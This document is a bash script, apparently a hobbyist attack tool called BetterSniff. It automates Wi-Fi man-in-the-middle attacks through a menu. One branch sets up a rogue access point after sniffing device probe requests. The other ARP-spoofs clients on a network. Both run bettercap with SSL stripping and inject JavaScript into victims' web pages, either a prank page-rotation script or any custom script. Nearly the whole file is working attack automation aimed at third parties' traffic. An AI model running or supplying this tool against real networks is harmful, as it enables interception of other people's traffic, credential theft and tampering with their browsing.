#!/bin/bash

cyan='\e[1;36m'
red='\e[1;31m'
lightred='\e[0;31m'
purple='\e[1;35m'
lightpurple='\e[0;35m'
white='\e[1;37m'
clean='\e[0m'

print_banner () {
sleep 0.1
echo -e "${cyan} ____       _   _            _____       _  __  __"
sleep 0.1
echo "|  _ \     | | | |          / ____|     (_)/ _|/ _|"
sleep 0.1
echo "| |_) | ___| |_| |_ ___ _ _| (___  _ __  _| |_| |"
sleep 0.1
echo "|  _ < / _ \ __| __/ _ \ '__\___ \| '_ \| |  _|  _|"
sleep 0.1
echo "| |_) |  __/ |_| ||  __/ |  ____) | | | | | | | |"
sleep 0.1
echo "|____/ \___|\__|\__\___|_| |_____/|_| |_|_|_| |_|"
sleep 0.1
echo -e "${clean} by 90N45-d3v"
}

print_banner_quik () {
echo -e "${cyan} ____       _   _            _____       _  __  __"
echo "|  _ \     | | | |          / ____|     (_)/ _|/ _|"
echo "| |_) | ___| |_| |_ ___ _ _| (___  _ __  _| |_| |"
echo "|  _ < / _ \ __| __/ _ \ '__\___ \| '_ \| |  _|  _|"
echo "| |_) |  __/ |_| ||  __/ |  ____) | | | | | | | |"
echo "|____/ \___|\__|\__\___|_| |_____/|_| |_|_|_| |_|"
echo -e "${clean} by 90N45-d3v"
}

clear
print_banner
sleep 0.5

printf "\n${red}[1] ${lightred}Create rogue AP and sniff traffic\n"
sleep 0.2
printf "${purple}[2] ${lightpurple}Sniff in network as client with the help of ARP-Spoofing\n\n"

printf "${white} | Choose number: ${clean}"
read -p "" ap_or_sta

# as rogue AP
if [ $ap_or_sta = 1 ]
then
clear
print_banner_quik
sleep 0.2
printf "\n${white} | Do you need some probes for SSID inspiration? (y/n): ${clean}"
read -p "" inspiration
clear
print_banner_quik
sleep 0.2
printf "\n${clean}"
iwconfig
sleep 0.2
printf "\n${white} | Interface with internet connection (ex. wlan0): ${clean}"
read -p "" net_interface
clear
print_banner_quik
sleep 0.2
printf "\n${clean}"
iwconfig
sleep 0.2
printf "\n${white} | Wifi interface for attack (ex. wlan0): ${clean}"
read -p "" interface
if [ $inspiration = y ]
then
mon_check=$(iwconfig $interface | grep Monitor -c)
sleep 0.2
if [ $mon_check = 0 ]
then
printf "\n${red}[*] ${lightred}Setting up monitor mode..."
airmon-ng start $interface > /dev/null
clear
print_banner_quik
printf "\n${clean}"
sleep 0.2
iwconfig
sleep 0.2
printf "\n${white} | Retype Wifi interface for attack (It's now in monitor mode for sniffing probes): ${clean}"
read -p "" interface_mon
fi
clear
print_banner_quik
printf "\n\n${white}SCANNING FOR PROBES FROM NEARBY DEVICES"
printf "\n${red}[*] ${lightred}Press Ctrl+C for ending the scan...${cyan}\n\n"
printf "Vendor+MAC <-----> MAC <-----> SSID${clean}\n"
tshark -i $interface_mon -Y wlan.fc.type_subtype==4 -T fields -e wlan.sa_resolved -e wlan.sa -e wlan.ssid 2> /dev/null
fi
airmon-ng stop $interface_mon > /dev/null
if [ $inspiration = n ]
then
mon_check=$(iwconfig $interface | grep Monitor -c)
sleep 0.2
if [ $mon_check = 1 ]
then
printf "\n${red}[*] ${lightred}Please don't use an interface in monitor mode..."
sleep 0.5
printf "\n${red}[*] ${lightred}Setting interface back in normal mode..."
airmon-ng stop $interface > /dev/null
sleep 1
clear
print_banner_quik
sleep 0.2
printf "\n${clean}"
iwconfig
sleep 0.2
printf "\n\n${white} | Retype Wifi interface for attack (It now isn't in monitor mode anymore): ${clean}"
read -p "" interface
fi
fi
printf "\n\n${white} | Write down the SSID for your rogue AP:${clean}"
read -p " " ssid
clear
print_banner_quik
sleep 0.2
printf "\n${purple}[1] ${lightpurple}180°-JS (if page was clicked, rotate it)\n"
sleep 0.2
printf "\n${red}[2] ${lightred}Custom\n"
sleep 0.2
printf "\n${white}[3] ${clean}No injection\n\n"
sleep 0.2
printf "${white} | Choose JS-Injection:${clean}"
read -p " " js
if [ $js = 1 ]
then
printf "\n\n${red}[*] ${lightred}Selecting 180°-JS as injection..."
sleep 0.2
printf "\n\n${red}[*] ${lightred}Writing JavaScript for injection..."
cat <<EOF > BetterSniff_injection.js
setTimeout(function(){
        document.onmousemove = document.onkeypress = function(){
                ['', '-ms-', '-webkit-', '-o-', '-moz-'].map(function(prefix){
                        document.body.style[prefix + 'transition'] = prefix + 'transform 3s';
                        document.body.style[prefix + 'transform'] = 'rotate(180deg)';
                });
        }
}, 5000);
EOF
sleep 0.2
printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
path=$(pwd)
cat <<EOF > sniffconf.cap
set net.sniff.local true
set http.proxy.sslstrip true
set http.proxy.injectjs ${path}/BetterSniff_injection.js
http.proxy on
net.recon on
net.sniff on
net.probe on
EOF
sleep 1
clear
print_banner_quik
sleep 0.2
printf "\n${red}[*] ${lightred}Creating rogue AP on ${interface} as ${ssid}...\n\n${cyan}"
create_ap ${interface} ${net_interface} ${ssid} --daemon --no-virt > /dev/null
sleep 10
printf "\n${red}[*] ${lightred}Starting Bettercap as sniffer on ${interface}...\n\n${cyan}"
sleep 1
bettercap -iface $interface -caplet sniffconf.cap
fi
if [ $js = 2 ]
then
printf "\n${white} | Please enter path to file.js: ${clean}"
read -p "" js_path
sleep 0.2
printf "\n${red}[*] ${lightred}Slelecting ${js-path} as injection..."
sleep 0.2
printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
cat <<EOF > sniffconf.cap
set net.sniff.local true
set http.proxy.sslstrip true
set http.proxy.injectjs ${js_path}
http.proxy on
net.recon on
net.sniff on
net.probe on
EOF
sleep 1
clear
print_banner_quik
sleep 0.2
printf "\n${red}[*] ${lightred}Creating rogue AP on ${interface} as ${ssid}...\n\n${cyan}"

sleep 0.2
printf "\n${red}[*] ${lightred}Starting Bettercap as sniffer on ${interface}...\n\n${cyan}"
sleep 1
bettercap -iface $interface -caplet sniffconf.cap
fi
if [ $js = 3 ]
then
printf "\n\n${red}[*] ${lightred}Don't selecting any injection..."
sleep 0.2
printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
cat <<EOF > sniffconf.cap
set net.sniff.local true
set http.proxy.sslstrip true
http.proxy on
net.recon on
net.sniff on
net.probe on
EOF
sleep 1
clear
print_banner_quik
sleep 0.2
printf "\n${red}[*] ${lightred}Creating rogue AP on ${interface} as ${ssid}...\n\n${cyan}"
create_ap ${interface} ${net_interface} ${ssid} --daemon --no-virt > /dev/null
sleep 10
printf "\n${red}[*] ${lightred}Starting Bettercap as sniffer on ${interface}...\n\n${cyan}"
sleep 1
bettercap -iface $interface -caplet sniffconf.cap
fi
clear
print_banner_quik
fi

# as client
if [ $ap_or_sta = 2 ]
then
clear
print_banner_quik
sleep 0.2
printf "\n${clean}"
iwconfig
sleep 0.2
printf "\n${white} | Wifi interface for attack (ex. wlan0): ${clean}"
read -p "" interface
mon_check=$(iwconfig $interface | grep Monitor -c)
sleep 0.2
if [ $mon_check = 1 ]
then
printf "\n${red}[*] ${lightred}Please don't use an interface in monitor mode..."
sleep 0.2
printf "\n${red}[*] ${lightred}Setting interface back in normal mode..."
airmon-ng stop $interface > /dev/null
sleep 0.2
clear
print_banner_quik
printf "\n${clean}"
iwconfig
sleep 0.2
printf "\n\n${white} | Retype Wifi interface for attack (It now isn't in monitor mode anymore): ${clean}"
read -p "" interface
fi
clear
print_banner_quik
sleep 0.2
printf "\n${purple}[1] ${lightpurple}180°-JS\n"
sleep 0.2
printf "\n${red}[2] ${lightred}Custom\n"
sleep 0.2
printf "\n${white}[3] ${clean}No injection\n\n"
sleep 0.2
printf "${white} | Choose JS-Injection:${clean}"
read -p " " js
if [ $js = 1 ]
then
printf "\n\n${red}[*] ${lightred}Selecting 180°-JS as injection..."
sleep 0.2
printf "\n\n${red}[*] ${lightred}Enable IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 0.2
printf "\n\n${red}[*] ${lightred}Writing JavaScript for injection..."
cat <<EOF > BetterSniff_injection.js
setTimeout(function(){
        document.onmousemove = document.onkeypress = function(){ 
                ['', '-ms-', '-webkit-', '-o-', '-moz-'].map(function(prefix){
                        document.body.style[prefix + 'transition'] = prefix + 'transform 3s';
                        document.body.style[prefix + 'transform'] = 'rotate(180deg)';
                });
        }
}, 5000);
EOF
sleep 0.2
printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
path=$(pwd)
cat <<EOF > sniffconf.cap
set net.sniff.local true
set arp.spoof.fullduplex true
set arp.spoof.internal true
set http.proxy.sslstrip true
set http.proxy.injectjs ${path}/BetterSniff_injection.js
http.proxy on
arp.spoof on
net.recon on
net.sniff on
net.probe on
EOF
sleep 1
clear
print_banner_quik
sleep 0.2
printf "\n${red}[*] ${lightred}Starting Bettercap as sniffer on ${interface}...\n\n${cyan}"
sleep 1
bettercap -iface $interface -caplet sniffconf.cap
fi
if [ $js = 2 ]
then
printf "\n${white} | Please enter full path to file.js: ${clean}"
read -p "" js_path
sleep 0.2
printf "\n${red}[*] ${lightred}Slelecting ${js_path} as injection..."
sleep 0.2
printf "\n\n${red}[*] ${lightred}Enable IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 0.2
printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
cat <<EOF > sniffconf.cap
set net.sniff.local true
set arp.spoof.fullduplex true
set arp.spoof.internal true
set http.proxy.sslstrip true
set http.proxy.injectjs $js_path
http.proxy on
arp.spoof on
net.recon on
net.sniff on
net.probe on
EOF
sleep 1
clear
print_banner_quik
sleep 0.2
printf "\n${red}[*] ${lightred}Starting Bettercap as sniffer on ${interface}...\n\n${cyan}"
sleep 1
bettercap -iface $interface -caplet sniffconf.cap
fi
if [ $js = 3 ]
then
printf "\n\n${red}[*] ${lightred}Don't selecting any injection..."
sleep 0.2
printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
cat <<EOF > sniffconf.cap
set net.sniff.local true
set arp.spoof.fullduplex true
set arp.spoof.internal true
set http.proxy.sslstrip true
http.proxy on
arp.spoof on
net.recon on
net.sniff on
net.probe on
EOF
sleep 1
clear
print_banner_quik
sleep 0.2
printf "\n${red}[*] ${lightred}Starting Bettercap as sniffer on ${interface}...\n\n${cyan}"
sleep 1
bettercap -iface $interface -caplet sniffconf.cap
fi


fi


printf "\n${cyan}GOOD BYE!\n"

rm BetterSniff_injection.js 2> /dev/null
rm sniffconf.cap 2> /dev/null
create_ap --stop ${interface} > /dev/null
